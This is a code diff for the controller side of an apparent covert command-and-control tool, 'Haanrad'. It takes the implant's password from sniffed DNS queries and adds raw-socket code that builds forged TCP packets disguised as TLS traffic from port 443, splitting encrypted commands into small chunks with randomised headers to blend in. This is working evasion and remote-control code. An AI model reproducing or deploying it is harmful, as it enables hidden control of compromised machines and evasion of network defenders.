@@ -6,6 +6,7 @@
 #include <iostream>
 #include <cstring>
 #include <netinet/udp.h>
+#include <netinet/tcp.h>
 #include <dnet.h>
 #include "CommHandler.h"
 #include "MessageQueue.h"
@@ -22,6 +23,24 @@ CommHandler::CommHandler(MessageQueue * messageQueue, HCrypto * crypto) {
 
     if(!getInterface()){
         Logger::debug(to_string(getpid()) + " CommHandler - There Was An Error Fetching The Interface For The Monitor");
+    }
+
+    this->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
+    int arg = 1;
+    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
+        Logger::debug("CovertSocket - SetSockOpt Failed For SO_REUSEADDR. Error: " + string(strerror(errno)));
+    }
+
+    //IP_HDRINCL to stop the kernel from building the packet headers
+    {
+        int one = 1;
+        const int *val = &one;
+        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
+            Logger::debug("CovertSocket - SetSockOpt Failed For IP_HDRINCL. Error: " + string(strerror(errno)));
+        }
+
     }
 }
 
@@ -41,6 +60,10 @@ void CommHandler::killListening() {
     if(this->currentFD != nullptr){
         pcap_breakloop(this->currentFD);
     }
+}
+
+void CommHandler::killProcessing() {
+    this->continueProcessing = false;
 }
 
 bool CommHandler::getInterface() {
@@ -170,6 +193,14 @@ void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_
             string password = CommHandler::instance->parseOutDNSQuery(meta);
             Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Received Password From Haanrad: >" + password + "<");
 
+            //set the IP of haanrad
+            struct iphdr * ip2 = (struct iphdr *)meta.packet;
+            in_addr_t da = (in_addr_t)ip2->saddr;
+            char sourceIP[INET_ADDRSTRLEN];
+            inet_ntop(AF_INET, &da, sourceIP, INET_ADDRSTRLEN);
+            string strSourceIP(sourceIP);
+            CommHandler::instance->haanradIP = strSourceIP;
+
             //initialize all components for communicating with Haanrad
             CommHandler::instance->password = password;
             CommHandler::instance->haanradConnected = true;
@@ -273,8 +304,164 @@ void CommHandler::listenForMessages() {
 
 }
 
-long CommHandler::processMessagesToSend() {
+void CommHandler::sendPacket(string payload) {
 
+    char datagram[IP_MAXPACKET];
+    memset(datagram, 0, IP_MAXPACKET);
 
+    struct iphdr *ip = (struct iphdr *) datagram;
+    int ipLength = (5 * 4);
+    struct tcphdr *tcp = (struct tcphdr *) (datagram + ipLength);
+    struct TLS_HEADER * tls = (struct TLS_HEADER *)(datagram + ipLength + sizeof(struct tcphdr));
+    char * payloadPtr = (datagram + ipLength + sizeof(struct tcphdr) + sizeof(struct TLS_HEADER));
 
+    //move in the payload
+    memcpy(payloadPtr, payload.c_str(), payload.size());
+
+    struct sockaddr_in sin;
+
+    //create sockaddr_in for sendto
+    unsigned short destPort = (rand() % 4970) + 1030; // generate a random dest port between 1030 and 6000
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(destPort);
+    sin.sin_addr.s_addr = inet_addr(this->haanradIP.c_str());
+
+    //set IP fields
+    unsigned int id = (rand() % 4970) + 1030; // generate a random id between 1030 and 6000
+    //IP Header Fields
+    ip->ihl = 5;        // IP Header Length
+    ip->version = 4;        // Version 4
+    ip->tos = 0;
+    ip->tot_len = 0;    // Calculate the total Datagram size - Need to do this AFTER Encryption and Auth
+    ip->id = htonl(id);    //IP Identification Field
+    ip->frag_off = 0;
+    ip->ttl = 255;        // Set the TTL value
+    ip->protocol = IPPROTO_TCP;
+    ip->saddr = inet_addr (this->haanradIP.c_str());  //Source IP address
+    ip->daddr = sin.sin_addr.s_addr;
+
+    //set TCP fields
+    unsigned int sequenceNumber = (rand() % 4294963096) + 4000; //generate random sequence number from 4000 - (TCP_SEQ_MAX - 200)
+    unsigned int ackNumber = (rand() % 4294963096) + 4000;
+
+    tcp->seq = htonl(sequenceNumber);
+    tcp->ack_seq = htonl(ackNumber);
+    tcp->doff = 5;
+    tcp->psh = 1; //this is a push packet
+    tcp->fin=0;
+    tcp->syn=0;
+    tcp->rst=0;
+    tcp->ack=1;
+    tcp->urg=0;
+    tcp->window = htons (rand()% 4000 + 1024);
+    tcp->urg_ptr = 0;
+    tcp->check = 0; //leave to 0 so that the stack will generate our checksum
+
+    tcp->source = htons(443);
+    tcp->dest = htons(destPort);
+
+    //set TLS fields
+    tls->contentType = 23;
+    tls->type = 771;
+    tls->length = htons(1); //length will be filled in by crypto - needs to be greater then 0 for PacketIdentifier to recognize
+
+    //generate a PacketMeta from all of this - from this point on must use meta.packet
+    PacketMeta meta = PacketIdentifier::generatePacketMeta(datagram);
+
+    Authenticator::addAuthSignature(&meta);
+    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
+    if(applicationLayer == nullptr){
+        Logger::debug("CommHandler:sendPacket - Failed To Find Application Layer. Can't Send Packet");
+        return;
+    }
+
+    this->crypto->encryptPacket(&meta, applicationLayer);
+
+    //calculate IP Length
+    struct iphdr *ip2 = (struct iphdr *)meta.packet;
+    struct TLS_HEADER * tls2 = (struct TLS_HEADER *)applicationLayer;
+    ip2->tot_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + sizeof(struct TLS_HEADER) + ntohs(tls2->length));
+
+    //calculate IP Checksum
+    ip2->check = 0;        //Initialize to zero before calculating checksum
+    ip2->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));
+
+    //we can now send this packet
+    Logger::debug("CommHandler:sendPacket - Sending Packet");
+    ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip2->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
+    if(result < 0){
+        Logger::debug("CommHandler:sendPacket - SendTo Failed. Error: " + string(strerror(errno)));
+    }
+
+}
+
+void CommHandler::processMessagesToSend() {
+
+    while(this->continueProcessing){
+        Message message = this->messageQueue->getMessageToSend();
+        if(message.interMessageCode != InterClientMessageType::EMPTY){
+            //there is a legit message to be sent
+
+            //haanrad TLS packets have a max capactiy of 35 bytes of plaintext data
+
+            string payload = message.rawCommandMessage;
+
+            unsigned long currentFullLength = payload.length() + CommHandler::instance->password.length();
+
+            while(currentFullLength > 35 || currentFullLength > CommHandler::instance->password.length()){
+
+                string acceptablePortion;
+                string remainder;
+
+                unsigned long acceptableLength = (35 - CommHandler::instance->password.length());
+                if(payload.length() < acceptableLength){
+                    acceptablePortion = payload;
+                    remainder = "";
+                }else{
+                    acceptablePortion = payload.substr(0, (35 - CommHandler::instance->password.length()));
+                    remainder = payload.substr((35 - CommHandler::instance->password.length()));
+                }
+
+                Logger::debug("CommHandler:processMessagesToSend - Acceptable Portion: >" + acceptablePortion + "<");
+                Logger::debug("CommHandler:processMessagesToSend - Remainder That Will Be Sent In Next Packet: >" + remainder + "<");
+
+                //update the payload
+                payload = remainder;
+                currentFullLength = payload.length() + CommHandler::instance->password.length();
+
+                sendPacket(acceptablePortion);
+            }
+        }
+    }
+}
+
+/**
+ * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
+ * by the network stack
+ * @param ptr
+ * @param nbytes
+ * @return
+ */
+unsigned short CommHandler::csum (unsigned short *ptr,int nbytes)
+{
+    register long sum;
+    unsigned short oddbyte;
+    register short answer;
+
+    sum=0;
+    while(nbytes>1) {
+        sum+=*ptr++;
+        nbytes-=2;
+    }
+    if(nbytes==1) {
+        oddbyte=0;
+        *((u_char*)&oddbyte)=*(u_char*)ptr;
+        sum+=oddbyte;
+    }
+
+    sum = (sum>>16)+(sum & 0xffff);
+    sum = sum + (sum>>16);
+    answer=(short)~sum;
+
+    return(answer);
 }
